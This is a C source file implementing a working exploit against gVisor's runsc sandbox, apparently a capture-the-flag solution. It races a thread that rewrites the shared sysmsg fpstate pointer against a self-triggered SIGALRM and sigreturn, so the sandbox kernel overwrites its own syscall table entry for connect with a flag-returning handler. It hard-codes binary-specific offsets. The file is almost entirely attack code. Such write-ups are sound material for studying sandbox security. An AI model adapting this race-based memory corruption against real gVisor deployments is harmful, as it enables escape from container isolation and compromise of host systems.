#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <inttypes.h>
#include <sys/user.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <errno.h>
#include <asm/prctl.h>
#include <sys/prctl.h>
#include <sys/ucontext.h>
#include <ucontext.h>
#include <pthread.h>
#include <sys/ptrace.h>

// Functions implemented in "stub.S"
size_t get_sysmsg(void);
void fill_fp_regs(void);

// Relevant values for exploit (of the given 'runsc' binary) 
#define CONNECT_SYSCALL_TABLE_ENTRY (0x1e7c2c0)
#define GETFLAG_SYSCALL_TABLE_VALUE_TO_REPLACE (0x1310C68)
#define XMM0_OFFSET_IN_GVISOR_FPSTATE (0x80)
#define GVISOR_FPSTATE_WRITE_OFFSET (0x20)

// Struct taken from gvisor source code
struct sysmsg {
  struct sysmsg *self;
  uint64_t ret_addr;
  uint64_t syshandler;
  uint64_t syshandler_stack;
  uint64_t app_stack;
  uint32_t interrupt;
  int32_t fault_jump;
  uint32_t type;
  uint32_t state;
  uint64_t sentry_addr;   // This need to be added so the Msg will be parsed correctly
  int32_t signo;
  int32_t err;
  int32_t err_line;
  uint64_t debug;
  struct user_regs_struct ptregs;
  uint64_t fpstate;
  siginfo_t siginfo;
  // tls is only populated on ARM64.
  uint64_t tls;
  uint32_t stub_fast_path;
  uint32_t sentry_fast_path;
  uint32_t acked_events;
};

// Empty handler (so when getting SIGALRM - we will handle it but continue
// and return with sigreturn syscall from this handler)
void alarm_sighandler(int signo, siginfo_t *siginfo, void *ctx)
{
}

// Change the "sysmsg->fpstate" of the given sysmsg struct in an inifite loop.
// The target value is used so that 'gvisor' will overwrite its own syscall table
// entry (we assume that xmm0 is set to the correct value by the main thread).
void * change_fpstate_thread_func(void * sysmsg_ptr)
{
  volatile struct sysmsg * sysmsg = sysmsg_ptr;
  uint64_t sentry_addr = sysmsg->sentry_addr;

  while (1)
  {
    sysmsg->fpstate = CONNECT_SYSCALL_TABLE_ENTRY - XMM0_OFFSET_IN_GVISOR_FPSTATE - 
      sentry_addr - GVISOR_FPSTATE_WRITE_OFFSET;
  }
}

// Tries to get the flag (by calling "connect" syscall).
// If we succeded in overwriting the syscall talbe entry - we will
// get the flag back. We will print it and exit.
// Otherwise, we just return.
void get_flag(void)
{
  char flagbuf[0x100] = {0};
  syscall(__NR_connect, flagbuf, NULL, NULL, NULL, NULL, NULL);
  if (flagbuf[0] != '\0')
  {
    write(1, flagbuf, sizeof(flagbuf));
    exit(0);
  }
}

int main(void)
{
  pid_t my_pid = getpid();

  // Create a thread that changes "sysmsg->fpstate" of the main thread
  pthread_t thread_id;
  pthread_create(&thread_id, NULL, &change_fpstate_thread_func, (void *) get_sysmsg());

  // Install SIGALRM handler
  struct sigaction act = {
    .sa_sigaction = alarm_sighandler,
    .sa_flags = SA_SIGINFO
  };
  sigemptyset(&act.sa_mask);
  sigaction(SIGALRM, &act, NULL);

  // Main loop to race the other thread
  while (1)
  {
    // Fill xmm0 with value to override
    fill_fp_regs();

    // Send SIGALRM to self.
    // This will trigger the handler, which will call sigreturn.
    kill(my_pid, SIGALRM);

    // Try to get the flag (check if override was successful)
    get_flag();
  }  
}
